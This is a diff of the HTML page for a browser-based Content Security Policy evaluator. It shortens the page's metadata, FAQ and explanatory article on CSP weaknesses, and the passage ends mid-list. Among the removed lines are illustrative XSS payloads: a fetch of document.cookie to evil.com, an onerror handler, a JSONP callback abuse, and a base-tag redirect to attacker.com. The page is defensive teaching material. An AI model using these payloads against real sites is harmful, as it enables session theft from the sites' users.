@@ -6,8 +6,8 @@
   
   <title>Content Security Policy (CSP) Evaluator — Free Offline Security Tool | BitDark</title>
   <meta name="title" content="Content Security Policy (CSP) Evaluator — Free Offline Security Tool | BitDark" />
-  <meta name="description" content="Audit, evaluate, and identify bypasses or misconfigurations in Content Security Policy (CSP) directives locally in browser memory. Detect unsafe-inline gaps, wildcard domains, missing clickjacking guards, and base-uri injection vulnerabilities with zero network egress." />
-  <meta name="keywords" content="csp evaluator, content security policy checker, test csp directives, xss defense audit, local csp validator, strict-dynamic analyzer, clickjacking protection, frame-ancestors, object-src, pci dss 6.4.3, bitdark" />
+  <meta name="description" content="Check a Content-Security-Policy for unsafe-inline, unsafe-eval, wildcards, missing object-src, base-uri and frame-ancestors, and learn why nonce-based policies beat allow-lists. Runs in your browser." />
+  <meta name="keywords" content="csp evaluator, content security policy checker, csp unsafe-inline, strict-dynamic nonce, csp allowlist bypass, frame-ancestors, xss protection header" />
   <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large" />
   <link rel="canonical" href="https://bitdark.net/tools/auth/csp-evaluator/" />
 
@@ -15,14 +15,14 @@
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://bitdark.net/tools/auth/csp-evaluator/" />
   <meta property="og:title" content="Content Security Policy (CSP) Evaluator — Offline Security Audit | BitDark" />
-  <meta property="og:description" content="Audit HTTP Content-Security-Policy headers for XSS defense, wildcard vulnerabilities, and framing bypasses entirely in browser memory. 100% private with zero network transmission." />
+  <meta property="og:description" content="Paste a Content-Security-Policy to check common weaknesses, with a worked test of what the evaluator catches and misses. Runs in your browser." />
   <meta property="og:image" content="https://bitdark.net/assets/preview-banner.png" />
 
   <!-- Twitter / X -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:url" content="https://bitdark.net/tools/auth/csp-evaluator/" />
   <meta name="twitter:title" content="Content Security Policy (CSP) Evaluator | BitDark" />
-  <meta name="twitter:description" content="Evaluate Content Security Policy headers offline in browser memory. Zero tracking, zero telemetry." />
+  <meta name="twitter:description" content="Check a Content-Security-Policy for common weaknesses in your browser." />
 
   <!-- JSON-LD Structured Data: WebApplication, TechArticle, and FAQPage -->
   <script type="application/ld+json">
@@ -34,17 +34,17 @@
         "name": "Content Security Policy (CSP) Evaluator",
         "url": "https://bitdark.net/tools/auth/csp-evaluator/",
         "applicationCategory": "SecurityApplication",
-        "operatingSystem": "All modern browsers (Offline-ready)",
+        "operatingSystem": "Any modern web browser",
         "offers": {
           "@type": "Offer",
           "price": "0",
           "priceCurrency": "USD"
         },
-        "description": "Defensive cybersecurity tool to parse, evaluate, and diagnose Content-Security-Policy (CSP) HTTP response headers for Cross-Site Scripting (XSS) defense effectiveness, JSONP bypasses, missing fallback directives, and framing protections directly inside browser memory without network egress."
+        "description": "Browser-based Content-Security-Policy checker for unsafe-inline, unsafe-eval, wildcards, nonce or hash usage, object-src, base-uri and frame-ancestors."
       },
       {
         "@type": "TechArticle",
-        "headline": "Content Security Policy Architecture: Directive Diagnostics, XSS Mitigation, and Bypasses",
+        "headline": "Evaluating a Content Security Policy: Common Mistakes, Allow-List Risks and a Strict Starting Policy",
         "url": "https://bitdark.net/tools/auth/csp-evaluator/",
         "author": {
           "@type": "Organization",
@@ -57,66 +57,50 @@
           "url": "https://bitdark.net/"
         },
         "datePublished": "2024-03-20",
-        "dateModified": "2026-11-01",
-        "description": "Authoritative technical guide covering W3C Content Security Policy Level 3 specifications, strict nonce architectures, strict-dynamic mechanics, AST directive parsing, and PCI DSS 4.0 client-side compliance."
+        "dateModified": "2026-11-08",
+        "description": "What CSP does, the checks the evaluator runs, a worked test of six policies including missed allow-list bypasses, and a recommended nonce-based policy."
       },
       {
         "@type": "FAQPage",
         "mainEntity": [
           {
             "@type": "Question",
-            "name": "What is Content Security Policy (CSP) and how does it prevent Cross-Site Scripting (XSS)?",
+            "name": "Does \"Strict / Strong\" mean my CSP is secure?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "Content Security Policy (CSP) is a declarative HTTP response header (or meta tag) that instructs user agents to restrict the sources from which executable scripts, stylesheets, images, and other resources can load. By enforcing strict script execution origins, cryptographic nonces, or SHA hashes and disallowing inline scripts, CSP prevents injected malicious scripts from executing even if an application suffers from an HTML injection vulnerability."
+              "text": "Not necessarily. The evaluator doesn't assess host allow-lists, so a policy that allows a public CDN or a large domain can still be bypassed. Prefer nonces or hashes with 'strict-dynamic' over lists of hosts."
             }
           },
           {
             "@type": "Question",
-            "name": "Why is 'unsafe-inline' considered a critical security vulnerability?",
+            "name": "Why are domain allow-lists risky in script-src?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "The 'unsafe-inline' source expression permits the execution of inline script tags, inline event handlers (such as onload or onerror), and javascript: URIs. Because an attacker exploiting a reflected or stored XSS flaw injects inline script payloads, allowing 'unsafe-inline' without nonces or hashes completely neutralizes the primary Cross-Site Scripting defense provided by CSP."
+              "text": "Any script hosted on an allowed domain can run on your page. Public CDNs serve thousands of libraries, and many large sites have JSONP endpoints or old library versions that attackers can reuse to run their own code. Nonce- or hash-based policies avoid this."
             }
           },
           {
             "@type": "Question",
-            "name": "How does the CSP Level 3 'strict-dynamic' directive work?",
+            "name": "Is 'unsafe-inline' always dangerous?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "The 'strict-dynamic' directive specifies that trust granted to an individual script via a cryptographic nonce or hash is automatically propagated to any child scripts dynamically created and appended by that trusted script. In CSP Level 3 browsers, 'strict-dynamic' causes host allowlists, 'unsafe-inline', and generic schemes ('https:', 'http:') to be ignored, dramatically simplifying deployment for modern JavaScript applications while maintaining robust XSS defense."
+              "text": "In script-src, yes, unless the policy also has a nonce or hash. Browsers that support CSP Level 2 or later then ignore 'unsafe-inline', and it only applies as a fallback in very old browsers. In style-src it's much lower risk and often needed."
             }
           },
           {
             "@type": "Question",
-            "name": "Why does a secure CSP require setting object-src to 'none'?",
+            "name": "Do I still need object-src 'none' now that Flash is gone?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "The object-src directive controls the execution of embedded legacy plugin objects such as <object>, <embed>, and <applet>. Failing to restrict object-src allows attackers to execute legacy Flash, Java, or Silverlight content to bypass script restrictions or trigger same-origin browser memory corruption vulnerabilities."
+              "text": "Yes. It stops <object> and <embed> elements from loading content, which closes some injection paths, and it's part of Google's recommended strict CSP. Setting default-src 'none' also covers it."
             }
           },
           {
             "@type": "Question",
-            "name": "What is base-uri injection and why must it be restricted?",
+            "name": "Is my policy sent anywhere?",
             "acceptedAnswer": {
               "@type": "Answer",
-              "text": "The base-uri directive restricts the URLs that can appear in a document's <base> element. If an attacker injects a rogue <base href='https://attacker.com/'> tag into a page without base-uri restrictions, all subsequent relative script and stylesheet imports will resolve against the attacker's server, enabling remote code execution."
-            }
-          },
-          {
-            "@type": "Question",
-            "name": "How does frame-ancestors differ from the legacy X-Frame-Options header?",
-            "acceptedAnswer": {
-              "@type": "Answer",
-              "text": "The frame-ancestors directive specifies valid parents that may embed a page using <frame>, <iframe>, <object>, or <embed>, neutralizing clickjacking attacks. Unlike legacy X-Frame-Options (which only supports DENY or SAMEORIGIN), frame-ancestors supports granular domain allowlists, wildcard schemes, and multi-ancestor declarations, and takes precedence over X-Frame-Options in all modern user agents."
-            }
-          },
-          {
-            "@type": "Question",
-            "name": "Does BitDark transmit my Content Security Policy strings to remote servers?",
-            "acceptedAnswer": {
-              "@type": "Answer",
-              "text": "No. The BitDark CSP Evaluator operates under a strict zero-network-egress privacy architecture. Policy parsing, AST tokenization, heuristic risk scoring, and syntax diagnostic tree compilation execute 100% locally inside your client browser RAM."
+              "text": "No. Parsing and checks run in JavaScript in your browser, and the tool makes no network requests with your policy. It doesn't fetch or test your website."
             }
           }
         ]
@@ -778,7 +762,7 @@
 
     <div class="tool-header">
       <h1>Content Security Policy (CSP) Evaluator</h1>
-      <p>Analyze HTTP Content-Security-Policy headers for cross-site scripting (XSS) defense effectiveness, wildcard permissions, missing fallback directives, and clickjacking protections entirely within your browser memory.</p>
+      <p>Paste a Content-Security-Policy to check for common weaknesses: <code>'unsafe-inline'</code>, <code>'unsafe-eval'</code>, wildcards, and missing <code>object-src</code>, <code>base-uri</code> and <code>frame-ancestors</code>. Everything runs in your browser.</p>
     </div>
 
     <!-- AdSense Safe Placement Slot #1 (Zero CLS: Hidden until script loads & fills) -->
@@ -835,362 +819,130 @@
       </div>
     </section>
 
-    <!-- Operational Boundaries & Forensic Disclaimer -->
+    <!-- Tool Limitations & Disclaimer -->
     <aside class="disclaimer-card">
       <div class="disclaimer-header">
-        <span>⚠️</span> Operational Boundaries &amp; Forensic Disclaimer
+        <span>⚠️</span> Limitations & Disclaimer
       </div>
       <p>
-        <strong>BitDark.net is not responsible for any direct, indirect, incidental, or consequential damages, misattributions, legal liabilities, or forensic errors arising from the use or interpretation of data provided by this tool. Client-side heuristic scanners cannot replace hardware trust chains or formal chain-of-custody verification.</strong>
-      </p>
-      <p style="margin-top: 10px;">
-        <strong>Static heuristic CSP analysis does not guarantee runtime DOM immunity.</strong> While an evaluated header may adhere to structural best practices (such as strict-dynamic and cryptographic nonce scoping), application-layer vulnerabilities—including client-side template injection (CSTI), vulnerable open redirects on whitelisted CDN hosts, DOM-based XSS through sinks like <code>innerHTML</code> or <code>document.write</code>, and server-side nonce reuse—can circumvent policy boundaries. Always validate policy enforcement in staging environments using modern user-agent reporting mechanisms (<code>report-to</code> / <code>report-uri</code>) and pair header policies with architectural defenses such as W3C Trusted Types.
+        <strong>This checks common CSP mistakes, not every bypass.</strong> It doesn't evaluate host allow-lists, so a policy rated "Strict / Strong" can still be bypassed through an allowed CDN or domain. Test changes in report-only mode before enforcing them. Results are provided as-is; BitDark.net is not liable for decisions made using them.
       </p>
     </aside>
 
     <!-- Comprehensive Technical Authority Article -->
     <article class="article-container">
-      <h2>The Evolution of Web Injection Attacks and Why CSP is Essential</h2>
+      <h2>What CSP Does</h2>
       <p>
-        Cross-Site Scripting (XSS) has remained near the pinnacle of web application threat rankings for more than two decades. In traditional multi-tier web applications, dynamic rendering frequently mixes untrusted, user-supplied data with executable HTML markups. If an adversary injects arbitrary script content through query strings, form inputs, or stored database records, the victim's web browser cannot inherently distinguish between markup authored by the legitimate server and malicious script tags introduced by an attacker.
-      </p>
-      <p>
-        Historically, defensive engineering relied exclusively on context-aware output encoding, HTML entity sanitizers, and web application firewall (WAF) regex inspection rules. While context-aware encoding remains a foundational requirement, human development teams routinely overlook edge contexts—such as unquoted attribute strings, dynamic script blocks, DOM event handlers, and URI fragment sinks. A single missing sanitization filter on a complex enterprise portal renders the entire origin susceptible to session hijacking, credential harvesting, unauthorized transaction execution, and full account takeover.
-      </p>
-      <p>
-        To establish defense-in-depth, the World Wide Web Consortium (W3C) engineered the <strong>Content Security Policy (CSP)</strong> standard. CSP introduces a declarative security boundary implemented directly within browser rendering engines. Transmitted via the <code>Content-Security-Policy</code> HTTP response header, it dictates exactly which origins, protocol schemes, cryptographic nonces, and execution patterns are authorized to execute scripts, render frames, fetch asynchronous network resources, or apply stylesheets within the rendering context.
+        A Content Security Policy is a response header that tells the browser which scripts, styles, frames and other resources a page may load. Its main job is to limit cross-site scripting (XSS): even if an attacker injects a <code>&lt;script&gt;</code> tag, the browser refuses to run it unless the policy allows it. It's a second layer of defence, so you still need to escape output and sanitise input.
       </p>
 
-      <h2>How to Use the BitDark CSP Evaluator</h2>
+      <h2>What This Evaluator Checks</h2>
+      <div class="tech-table-wrapper">
+        <table class="tech-table">
+          <thead>
+            <tr>
+              <th>Check</th>
+              <th>Finding</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td>Neither <code>script-src</code> nor <code>default-src</code> set</td><td>High</td></tr>
+            <tr><td><code>'unsafe-inline'</code> in scripts without a nonce or hash</td><td>High</td></tr>
+            <tr><td><code>'unsafe-eval'</code> in scripts</td><td>Medium</td></tr>
+            <tr><td><code>*</code> in scripts</td><td>High</td></tr>
+            <tr><td><code>https:</code> or <code>http:</code> in scripts without <code>'strict-dynamic'</code> plus a nonce or hash</td><td>High</td></tr>
+            <tr><td>Nonce or SHA-256/384/512 hash present</td><td>Pass</td></tr>
+            <tr><td><code>object-src</code> (or <code>default-src</code>) not <code>'none'</code></td><td>High</td></tr>
+            <tr><td><code>base-uri</code> missing</td><td>Medium</td></tr>
+            <tr><td><code>frame-ancestors</code> missing</td><td>Medium</td></tr>
+          </tbody>
+        </table>
+      </div>
       <p>
-        Auditing your Content Security Policy with BitDark is private, instantaneous, and executes entirely in your local volatile RAM:
+        Script checks use <code>script-src</code>, or fall back to <code>default-src</code> if it isn't set, which matches browser behaviour. The rating is "Poor / High Risk" with any high finding, "Moderate Hardening" with any medium one, and "Strict / Strong" otherwise.
       </p>
+
+      <h2>How to Use the CSP Evaluator</h2>
       <ol>
-        <li>
-          <strong>Input or Extract the Policy String:</strong> Copy your production or staging <code>Content-Security-Policy</code> HTTP header value from your browser's Developer Tools (Network tab), server configuration file (Nginx, Apache, Caddy, Cloudflare Workers), or application middleware. Paste the raw directive string into the central textarea.
-        </li>
-        <li>
-          <strong>Load Reference Baselines (Optional):</strong> If you want to benchmark your policy against established standards, click <em>Strict Nonce-Based (CSP3)</em> to see Google and W3C's recommended modern architecture, or click <em>Permissive Legacy (Risky)</em> to observe how wildcard domain allowlists fail heuristic evaluation.
-        </li>
-        <li>
-          <strong>Execute In-Memory AST Parsing:</strong> Click <strong>Evaluate Policy</strong>. The BitDark engine parses the semicolon-delimited token stream into an Abstract Syntax Tree (AST), validates directive keywords, checks fallback relationships, and inspects script execution origins.
-        </li>
-        <li>
-          <strong>Review Directive Diagnostics &amp; Risk Flags:</strong> Analyze the flagged findings organized by severity (High, Medium, Low, or Pass). Examine whether <code>script-src</code> permits <code>'unsafe-inline'</code> or <code>'unsafe-eval'</code>, whether <code>object-src</code> is locked down to <code>'none'</code>, and whether <code>base-uri</code> prevents document hijacking.
-        </li>
-        <li>
-          <strong>Inspect the Normalized AST JSON:</strong> Review the formatted JSON AST map at the bottom of the tool to verify how user agents parse your whitespace, delimiter sequences, and source expression arrays.
-        </li>
+        <li><strong>Copy your policy</strong> from the <code>Content-Security-Policy</code> response header (Network tab in developer tools), without the header name.</li>
+        <li><strong>Paste it and click "Evaluate Policy"</strong>, or load a sample to compare.</li>
+        <li><strong>Fix high findings first</strong>, then use the parsed directive map at the bottom to confirm each directive was read as you intended.</li>
+        <li><strong>Test in report-only mode</strong> before enforcing: send the policy as <code>Content-Security-Policy-Report-Only</code> and watch for violations.</li>
       </ol>
 
-      <h2>Operational Scenarios: When and Where to Audit CSP Headers</h2>
-      <p>
-        Evaluating Content Security Policy headers is a mandatory checkpoint across modern DevSecOps and compliance workflows:
-      </p>
-      <ul>
-        <li>
-          <strong>Continuous Integration &amp; Deployment (CI/CD) Gates:</strong> Automated security pipelines audit response headers prior to production deployment, ensuring developers have not temporarily introduced <code>'unsafe-inline'</code> to patch an urgent tracking tag or third-party SDK.
-        </li>
-        <li>
-          <strong>Regulatory Compliance (PCI DSS 4.0 Requirement 6.4.3):</strong> Under modern payment card industry standards, all payment checkout pages must maintain an explicit inventory of authorized client-side scripts, verify script integrity, and enforce CSP or Subresource Integrity (SRI) to prevent Magecart e-skimming attacks.
-        </li>
-        <li>
-          <strong>Third-Party Vendor Risk Auditing:</strong> Security teams evaluate external SaaS portals and customer-facing web assets to determine whether external partners protect against UI redressing, session hijacking, and open redirect exploitation.
-        </li>
-        <li>
-          <strong>Bug Bounty &amp; Web Penetration Testing:</strong> Defensive teams model potential bypass chains by inspecting whether whitelisted CDN domains (such as <code>cdnjs.cloudflare.com</code> or <code>*.googleapis.com</code>) host vulnerable JSONP endpoints or outdated AngularJS libraries that enable arbitrary code execution.
-        </li>
-        <li>
-          <strong>Legacy Header Refactoring:</strong> Migrating deprecated <code>X-Frame-Options</code> and legacy host allowlists to modern CSP Level 3 <code>frame-ancestors</code> and <code>'strict-dynamic'</code> implementations.
-        </li>
-      </ul>
-
-      <h2>Deep Dive: Architecture of CSP Fetch Directives and Fallback Trees</h2>
-      <p>
-        Content Security Policy is organized into functional categories, with the <strong>Fetch Directives</strong> governing resource retrieval. Understanding the inheritance hierarchy is critical to prevent unintended exposure:
-      </p>
-
-      <pre><code>                        +-----------------------------+
-                        |        default-src          |
-                        +--------------+--------------+
-                                       |
-        +---------------+--------------+--------------+---------------+
-        |               |              |              |               |
-        v               v              v              v               v
-  +------------+  +------------+ +------------+ +------------+  +------------+
-  | script-src |  | style-src  | |  img-src   | |connect-src |  |  font-src  |
-  +------------+  +------------+ +------------+ +------------+  +------------+
-        |
-        +-----> (Does NOT fall back: object-src, base-uri, frame-ancestors!)</code></pre>
-
-      <p>
-        A widespread architectural misunderstanding among developers is assuming that defining <code>default-src 'self'</code> secures all aspects of the application. In reality, several critical attack surfaces <strong>do not inherit from <code>default-src</code></strong>:
-      </p>
-      <ul>
-        <li>
-          <strong><code>base-uri</code>:</strong> Restricts the URLs that can appear in a document's <code>&lt;base&gt;</code> element. If omitted, <code>base-uri</code> defaults to allowing any URI, regardless of what <code>default-src</code> specifies! An attacker who injects <code>&lt;base href="https://attacker.com/"&gt;</code> can redirect all relative script imports to their malicious server.
-        </li>
-        <li>
-          <strong><code>frame-ancestors</code>:</strong> Restricts which parent origins can embed the current document inside an <code>&lt;iframe&gt;</code>, <code>&lt;frame&gt;</code>, or <code>&lt;object&gt;</code> tag. It does not fall back to <code>default-src</code>. If <code>frame-ancestors</code> is missing, the site is unprotected against clickjacking unless <code>X-Frame-Options</code> is independently sent.
-        </li>
-        <li>
-          <strong><code>form-action</code>:</strong> Restricts the endpoints to which HTML <code>&lt;form&gt;</code> submissions can post data. If omitted, form targets are unrestricted, permitting malicious input injections that change form actions to external phishing capture servers.
-        </li>
-        <li>
-          <strong><code>object-src</code>:</strong> Controls plugin elements like <code>&lt;object&gt;</code> and <code>&lt;embed&gt;</code>. While <code>object-src</code> technically falls back to <code>default-src</code> in some specifications, setting <code>default-src 'self'</code> still allows loading Flash/Java objects hosted from your own domain, creating legacy bypass vectors. Best practice mandates explicitly setting <code>object-src 'none'</code>.
-        </li>
-      </ul>
-
-      <h2>Directive Specifications and Security Impact Matrix</h2>
+      <h2>Worked Example: Six Policies</h2>
       <div class="tech-table-wrapper">
         <table class="tech-table">
           <thead>
             <tr>
-              <th>Directive Keyword</th>
-              <th>Fallback Target</th>
-              <th>Critical Attack Surface</th>
-              <th>Hardened Production Baseline</th>
+              <th>Policy (script part)</th>
+              <th>Rating</th>
+              <th>Accurate?</th>
             </tr>
           </thead>
           <tbody>
-            <tr>
-              <td><code>script-src</code></td>
-              <td><code>default-src</code></td>
-              <td>Reflected, Stored, and DOM XSS execution</td>
-              <td><code>'nonce-{random}' 'strict-dynamic' https:</code></td>
-            </tr>
-            <tr>
-              <td><code>object-src</code></td>
-              <td><code>default-src</code></td>
-              <td>Plugin execution, Flash bypasses, ActiveX</td>
-              <td><code>'none'</code></td>
-            </tr>
-            <tr>
-              <td><code>base-uri</code></td>
-              <td><strong>None</strong> (Defaults to unrestricted <code>*</code>)</td>
-              <td>Relative URL hijacking, Base tag injection</td>
-              <td><code>'none'</code> or <code>'self'</code></td>
-            </tr>
-            <tr>
-              <td><code>frame-ancestors</code></td>
-              <td><strong>None</strong> (Defaults to unrestricted <code>*</code>)</td>
-              <td>UI redressing, Clickjacking, framing attacks</td>
-              <td><code>'none'</code> or explicit parent origins</td>
-            </tr>
-            <tr>
-              <td><code>connect-src</code></td>
-              <td><code>default-src</code></td>
-              <td>Unauthorized data exfiltration via <code>fetch</code> / <code>XHR</code></td>
-              <td><code>'self' https://api.yourdomain.com</code></td>
-            </tr>
-            <tr>
-              <td><code>form-action</code></td>
-              <td><strong>None</strong> (Defaults to unrestricted <code>*</code>)</td>
-              <td>Phishing redirects, form credential exfiltration</td>
-              <td><code>'self'</code></td>
-            </tr>
-            <tr>
-              <td><code>style-src</code></td>
-              <td><code>default-src</code></td>
-              <td>CSS-based data exfiltration via font/image leaks</td>
-              <td><code>'self' 'unsafe-inline'</code> (or nonce/hash)</td>
-            </tr>
+            <tr><td>Built-in strict sample: <code>'nonce-…' 'strict-dynamic' https:</code> with <code>object-src 'none'</code>, <code>base-uri 'none'</code>, <code>frame-ancestors 'none'</code></td><td>Strict / Strong</td><td>Yes</td></tr>
+            <tr><td>Built-in permissive sample: <code>* 'unsafe-inline' 'unsafe-eval' http:</code></td><td>Poor / High Risk</td><td>Yes</td></tr>
+            <tr><td>A single <code>'sha256-…'</code> hash</td><td>Strict / Strong</td><td>Yes</td></tr>
+            <tr><td><code>'self' https://cdn.jsdelivr.net https://www.google.com</code></td><td>Strict / Strong</td><td><strong>No</strong>: public CDNs and large domains host scripts an attacker can reuse</td></tr>
+            <tr><td><code>'self' https://*.example-cdn.com</code></td><td>Strict / Strong</td><td><strong>No</strong>: any subdomain can serve scripts</td></tr>
+            <tr><td><code>'self' 'UNSAFE-INLINE'</code></td><td>Strict / Strong</td><td><strong>No</strong>: keywords aren't case-sensitive, so this allows inline script</td></tr>
           </tbody>
         </table>
       </div>
-
-      <h2>CSP Evolution: Level 1 Allowlisting vs CSP Level 3 'strict-dynamic'</h2>
       <p>
-        The security industry's approach to Content Security Policy has fundamentally transformed over the past decade. Understanding this paradigm shift is essential for designing resilient defenses:
+        The evaluator reliably catches the obvious problems. It doesn't judge host allow-lists, which are the most common reason real policies fail. Google researchers' 2016 study "CSP Is Dead, Long Live CSP!" found that the large majority of real-world allow-list policies could be bypassed. That's why nonce- or hash-based policies are now recommended.
       </p>
 
-      <h3>1. The Failure of Legacy Host Allowlisting (CSP Level 1 &amp; 2)</h3>
-      <p>
-        When CSP was initially introduced, organizations attempted to secure applications by creating exhaustive allowlists of trusted domains:
-      </p>
-      <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com https://*.googleapis.com https://cdn.jsdelivr.net;</code></pre>
-      <p>
-        Empirical security research conducted by Google (analyzing over 1 billion web pages) proved that <strong>over 95% of host-allowlist-based policies can be completely bypassed</strong>. The fundamental flaw of allowlists is the "JSONP &amp; Library Bypass Problem":
-      </p>
+      <h2>A Recommended Starting Policy</h2>
+      <pre><code>Content-Security-Policy:
+  script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  frame-ancestors 'self';
+  form-action 'self'</code></pre>
       <ul>
-        <li>Whitelisted CDNs like <code>cdnjs.cloudflare.com</code> or <code>cdn.jsdelivr.net</code> host hundreds of thousands of historical JavaScript libraries, including vulnerable AngularJS versions that allow client-side template sandbox escapes.</li>
-        <li>Large enterprise origins like <code>*.googleapis.com</code> expose JSONP endpoints. An attacker injecting <code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie)"&gt;&lt;/script&gt;</code> easily executes arbitrary JavaScript because the host matches the allowlist!</li>
-      </ul>
-
-      <h3>2. The Modern Standard: CSP Level 3 Nonce-Based 'strict-dynamic'</h3>
-      <p>
-        To permanently eliminate allowlist bypasses, W3C introduced the <strong>Strict Nonce-Based Architecture</strong> powered by <code>'strict-dynamic'</code>:
-      </p>
-      <pre><code>Content-Security-Policy: default-src 'none'; script-src 'nonce-R4nd0mStr1ng' 'strict-dynamic' https: http:; object-src 'none'; base-uri 'none'; frame-ancestors 'none';</code></pre>
-      <p>
-        How this modern policy operates across modern and legacy browsers:
-      </p>
-      <ul>
-        <li><strong>Cryptographic Nonce:</strong> The application generates a cryptographically secure, unpredictable, single-use random string (minimum 128-bit entropy) for every HTTP response (e.g., <code>nonce-dGhpcy1pcy1hLXJhbmRvbS1ub25jZQ==</code>). Only <code>&lt;script nonce="..."&gt;</code> tags bearing this exact token execute.</li>
-        <li><strong>'strict-dynamic' Propagation:</strong> When modern browsers encounter <code>'strict-dynamic'</code>, any script that executes via a valid nonce is permitted to dynamically load subordinate scripts using <code>document.createElement('script')</code>. The child script inherits trust from the parent.</li>
-        <li><strong>Automatic Fallback Ignore:</strong> When <code>'strict-dynamic'</code> is parsed by a CSP Level 3 compliant browser, the user agent <strong>automatically ignores host allowlists and generic schemes (<code>https:</code>, <code>http:</code>)</strong>. Those fallback schemes are retained purely so legacy browsers (which don't understand <code>strict-dynamic</code>) still load scripts.</li>
-      </ul>
-
-      <h2>Worked Examples: Dissecting Policies in Real-World Scenarios</h2>
-      <p>
-        Let us examine two concrete policies to understand how the BitDark evaluator diagnoses structural risks.
-      </p>
-
-      <h3>Scenario A: Vulnerable Permissive Policy (Common in Legacy Apps)</h3>
-      <pre><code>Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval' http:; style-src * 'unsafe-inline';</code></pre>
-      <p>
-        <strong>Diagnostic Analysis by BitDark Engine:</strong>
-      </p>
-      <ul>
-        <li><strong>Severity HIGH — Wildcard Script Loading:</strong> Using <code>*</code> in <code>script-src</code> permits loading remote script files from any domain on the public Internet.</li>
-        <li><strong>Severity HIGH — Unrestricted 'unsafe-inline':</strong> Without nonces or hashes present, <code>'unsafe-inline'</code> allows an attacker injecting <code>&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code> to achieve immediate code execution.</li>
-        <li><strong>Severity MEDIUM — 'unsafe-eval' Permitted:</strong> Enables arbitrary execution of string primitives via <code>eval()</code>, <code>Function()</code>, and <code>setTimeout("string")</code>.</li>
-        <li><strong>Severity HIGH — Missing object-src:</strong> Leaves plugin execution vectors exposed.</li>
-        <li><strong>Severity MEDIUM — Missing frame-ancestors:</strong> Application can be embedded into malicious transparent iframes for clickjacking.</li>
-      </ul>
-
-      <h3>Scenario B: Hardened Enterprise Production Policy</h3>
-      <pre><code>Content-Security-Policy: default-src 'none'; script-src 'nonce-q8Z9mF2vP1aX0rL7' 'strict-dynamic' https:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'; connect-src 'self' https://api.enterprise.com;</code></pre>
-      <p>
-        <strong>Diagnostic Analysis by BitDark Engine:</strong>
-      </p>
-      <ul>
-        <li><strong>Status: Robust Architecture (Compliant).</strong></li>
-        <li><code>script-src</code> uses a strong cryptographic nonce combined with <code>'strict-dynamic'</code>. Generic <code>https:</code> is safely ignored by modern CSP Level 3 browsers.</li>
-        <li><code>object-src 'none'</code> disables legacy Flash/Java plugin execution surfaces entirely.</li>
-        <li><code>base-uri 'none'</code> eliminates <code>&lt;base&gt;</code> tag injection vulnerabilities.</li>
-        <li><code>frame-ancestors 'none'</code> completely immunizes the application from clickjacking and UI redressing attacks.</li>
-        <li><code>form-action 'self'</code> restricts form submission targets, preventing credential harvesting.</li>
-      </ul>
-
-      <h2>Comparison: CSP vs SRI vs SOP vs CORS vs Trusted Types</h2>
-      <p>
-        Application security requires combining multiple browser security mechanisms. Here is how Content Security Policy integrates with related client-side boundaries:
-      </p>
-      <div class="tech-table-wrapper">
-        <table class="tech-table">
-          <thead>
-            <tr>
-              <th>Security Standard</th>
-              <th>Enforcement Point</th>
-              <th>Primary Threat Mitigated</th>
-              <th>Defense Mechanism</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>Content Security Policy (CSP)</strong></td>
-              <td>HTTP Header / Meta Tag</td>
-              <td>Cross-Site Scripting (XSS), Clickjacking, Injection</td>
-              <td>Restricts resource origins, nonces, and script capabilities</td>
-            </tr>
-            <tr>
-              <td><strong>Subresource Integrity (SRI)</strong></td>
-              <td>HTML Tag Attribute (<code>integrity</code>)</td>
-              <td>Compromised external CDNs, malicious dependency poisoning</td>
-              <td>Cryptographic base64 hash verification of external asset bytes</td>
-            </tr>
-            <tr>
-              <td><strong>Same-Origin Policy (SOP)</strong></td>
-              <td>Browser Core Sandbox</td>
-              <td>Cross-origin DOM, cookie, and storage leakage</td>
-              <td>Isolates resources between distinct Protocol, Host, and Port origins</td>
-            </tr>
-            <tr>
-              <td><strong>Cross-Origin Resource Sharing (CORS)</strong></td>
-              <td>HTTP Headers (Server-Side)</td>
-              <td>Unauthorized API data reading across origins</td>
-              <td>Relaxes SOP selectively via preflight OPTIONS validations</td>
-            </tr>
-            <tr>
-              <td><strong>Trusted Types API</strong></td>
-              <td>DOM Injection API (W3C)</td>
-              <td>DOM-based Cross-Site Scripting sinks</td>
-              <td>Mandates typed wrappers before assigning strings to <code>innerHTML</code></td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-
-      <h2>Common Mistakes and Implementation Pitfalls</h2>
-      <p>
-        Even sophisticated engineering teams encounter critical policy misconfigurations. Beware of these common traps:
-      </p>
-      <ul>
-        <li>
-          <strong>Deploying in Enforcing Mode Without 'report-only' Staging:</strong> Introducing a strict CSP directly into production will almost certainly break third-party analytics, customer support chat widgets, and dynamic UI libraries. Always begin by deploying the <code>Content-Security-Policy-Report-Only</code> header, monitoring report telemetry for 14 to 30 days to catalog every legitimate script before switching to enforcement.
-        </li>
-        <li>
-          <strong>Using Static Nonces in Cacheable HTML:</strong> A cryptographic nonce <strong>must be dynamically generated on every single HTTP response</strong>. If your web application caches HTML pages at a CDN edge with a static nonce value (e.g., <code>nonce-hardcoded123</code>), an attacker can simply reuse that identical nonce in their XSS injection payload, completely bypassing the defense!
-        </li>
-        <li>
-          <strong>Allowing CDN Wildcard Roots:</strong> Specifying <code>script-src https://cdnjs.cloudflare.com</code> allows attackers to leverage any historical script hosted on Cloudflare's entire public library catalog. If you must use domain allowlists, specify exact file paths: <code>script-src https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js</code>.
-        </li>
-        <li>
